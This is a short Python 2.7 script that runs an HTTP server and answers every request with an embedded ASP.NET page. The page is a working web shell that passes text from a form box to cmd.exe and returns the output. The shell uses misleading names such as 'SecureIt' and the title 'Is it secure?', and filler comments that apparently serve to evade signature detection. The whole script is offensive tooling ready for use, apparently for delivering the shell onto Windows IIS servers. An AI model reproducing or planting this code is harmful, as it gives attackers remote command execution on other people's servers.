from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
# python 2.7
  
class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/aspx')
        self.send_header('Any', 'header')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        response = '''<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string SecureIt(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
// comment
psi.FileName = "cmd.exe";
// comment
psi.Arguments = "/c "+arg;
// comment
psi.RedirectStandardOutput = true;
// comment
psi.UseShellExecute = false;
// comment
Process p = Process.Start(psi);
// comment
StreamReader stmrdr = p.StandardOutput;
// comment
string s = stmrdr.ReadToEnd();
// comment
stmrdr.Close();
// comment
return s;
}
void SecureItMore(object sender, System.EventArgs e)
{
// comment
Response.Write("<pre>");
// comment
Response.Write(Server.HtmlEncode(SecureIt(txtArg.Text)));
// comment
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>Is it secure?</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 105; LEFT: 406px; POSITION: absolute; TOP: 21px" runat="server" Width="251px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 106; LEFT: 676px; POSITION: absolute; TOP: 19px" runat="server" Text="secure" OnClick="SecureItMore"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 107; LEFT: 311px; POSITION: absolute; TOP: 23px" runat="server">Secure?:</asp:Label>
</form>
</body>
</HTML>

'''
        self.wfile.write(response)

    def do_HEAD(self):
        self._set_headers()


def run(server_class=HTTPServer, handler_class=S, port=8080):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv
    run()